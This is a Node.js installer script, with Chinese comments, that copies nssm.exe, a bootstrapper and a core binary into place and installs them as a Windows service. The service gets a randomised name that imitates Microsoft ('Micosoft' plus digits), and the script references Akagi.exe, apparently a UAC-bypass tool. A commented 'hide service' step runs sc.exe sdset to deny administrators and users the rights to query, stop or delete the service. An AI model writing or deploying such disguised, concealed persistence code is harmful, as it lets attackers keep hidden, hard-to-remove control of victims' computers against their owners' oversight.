import * as fs from "fs";
import { execSync } from "child_process";
import gStatus from "./status";
const { STOPPED, waitForServiceStatus } = gStatus;
import * as path from "path";
import gConfig from "./my_config";

path.join(__dirname,  "./bin", "Akagi.exe");

function myCopyFileSync(sourcePath, targetPath) {
  const sourceData = fs.readFileSync(sourcePath);
  fs.writeFileSync(targetPath, sourceData);
}

const NEW_SERVICE_NAME = `Micosoft${Math.ceil(Math.random() * 100000)}`;
async function install() {
  console.log(fs.readdirSync(__dirname));
  try {
    fs.mkdirSync(gConfig.INSTALL_PATH, { recursive: true });
    myCopyFileSync(path.join(__dirname, "./bin", "nssm.exe"), gConfig.NSSM_PATH);
    myCopyFileSync(
      path.join(__dirname, "./bin", "bootstrapper.exe"),
      `${gConfig.BOOTSTRAPPER_PATH}`
    );
    myCopyFileSync(path.join(__dirname, "./dist", "serviceCore"), `${gConfig.CORE_PATH}`);
    // sleep(1000);
    execSync(
      `${gConfig.NSSM_PATH} install ${NEW_SERVICE_NAME} ${gConfig.BOOTSTRAPPER_PATH}`
    );
    // 检测服务是否安装完毕
    await waitForServiceStatus(NEW_SERVICE_NAME, STOPPED);
    execSync(`${gConfig.NSSM_PATH} start ${NEW_SERVICE_NAME}`);
    fs.writeFileSync(
      `${gConfig.INSTALL_PATH}serviceName`,
      `${NEW_SERVICE_NAME}%%${gConfig.BOOTSTRAPPER_NAME}`
    );
    console.log("安装完毕");
    // 隐藏服务
    execSync(
      `sc.exe sdset ${NEW_SERVICE_NAME} "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"`
    );
    console.log("隐藏完毕");
    await sleep(1000);
  } catch (e) {
    console.log(e);
    await sleep(50000);
  }
}

function sleep(msec) {
  return new Promise((r) => {
    setTimeout(() => {
      r(null);
    }, msec);
  });
}

install();
